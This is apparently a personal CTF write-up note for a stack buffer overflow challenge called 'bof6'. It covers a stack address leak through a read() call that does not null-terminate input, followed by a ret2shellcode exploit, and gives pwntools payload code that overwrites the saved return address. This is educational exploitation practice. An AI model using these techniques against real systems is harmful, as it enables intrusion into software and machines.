- `checksec` `file`
  ![[bof6_JHT-1.png]]
- decompile:
  ![[bof6_JHT-2.png]]
  ![[bof6_JHT-3.png]]
  ![[bof6_JHT-4.png]]
- NX off, no canary -> [[ret2shellcode]]
- `read` doesn't automatically add null byte `\x00` at the end of input -> able to leak data (stack canary or saved rip...) -> leak stack addr
- we'll use `get_name` to leak: 
  ![[bof6_JHT-5.png]]
  ![[bof6_JHT-6.png]]
- payload:
  ```python
	p.sendlineafter(b'> ', b'1')
	p.sendafter(b'> ', b'A' * 80)
	p.recvuntil(b'A'*80)
	leak = u64(p.recv(6).ljust(8, b'\x00'))
	log.info(f'leaked addr: {hex(leak)}')
  ```
- leak addr:
  ![[bof6_JHT-7.png]]
- find offset from shellcode to leaked addr:
  ![[bof6_JHT-8.png]]
- 0x220 = read size
- use `get_wish` to add shellcode + overwrite saved rip
- payload:
  ```python
	p.sendlineafter(b'> ', b'2')
	shellcode_addr = leak - 0x220
	payload = shellcode.ljust(520, b'A') + p64(shellcode_addr)
	p.sendafter(b'> ', payload) 
  ```